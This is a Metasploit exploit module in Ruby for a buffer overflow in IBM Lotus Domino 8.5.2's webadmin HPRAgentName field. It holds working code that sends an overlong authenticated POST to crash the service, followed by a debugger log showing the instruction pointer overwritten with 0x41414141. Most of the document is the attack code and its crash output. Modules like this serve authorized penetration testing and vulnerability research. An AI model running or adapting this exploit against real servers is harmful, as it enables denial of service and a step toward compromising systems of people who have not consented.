require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Lotus Domino HPRAgentName PoC',
			'Description'    => %q{
					This module is simply a trigger for the IBM Lotus Domino 8.5.2
				Nnotes.dll HPRAgentName buffer overflow.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'URL', 'http://www.research.reversingcode.com/index.php/advisories/73-ibm-ssd-1012211' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Lotus Domino 8.5.2', { 'Ret' => 0x41414141 } ], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 27 2011'))

		register_options( 
			[ 
				Opt::RPORT(80),
				OptString.new('HTTPUSER', [ false, 'The username to authenticate as', '']),
				OptString.new('HTTPPASS', [ false, 'The password to authenticate as', '']), 
			 ], self.class )
	end

	def exploit

		# in the form of: <domain> Administrator/<user>:<pass>
		user_pass = "#{datastore['HTTPUSER']}" + ":" + "#{datastore['HTTPPASS']}"

		trigger = pattern_create(4024)
		trigger[436, 8] = [target.ret].pack('V') * 2

		res = send_request_cgi(
			{
				'uri'		=> '/webadmin.nsf/fmHttpPostRequest?OpenForm&Seq=1',
				'method'	=> 'POST',
				'version'	=> '1.1',
				'data'		=> '__Click=0&tHPRAgentName=' + trigger,
				'headers'	=>
					{
						'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
					}
			}, 5)

		if res and res.body =~ /User not authenticated/
			print_error("Authentication failed...")
			return
		else
			print_status("Trying target #{target.name}...")
		end
	end

end
__END__
(bbc.cdc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=7c8285f6 esi=00000000 edi=00000000
eip=41414141 esp=0c9e5910 ebp=0c9e5930 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
<Unloaded_.dll>+0x41414140:
41414141 ??              ???
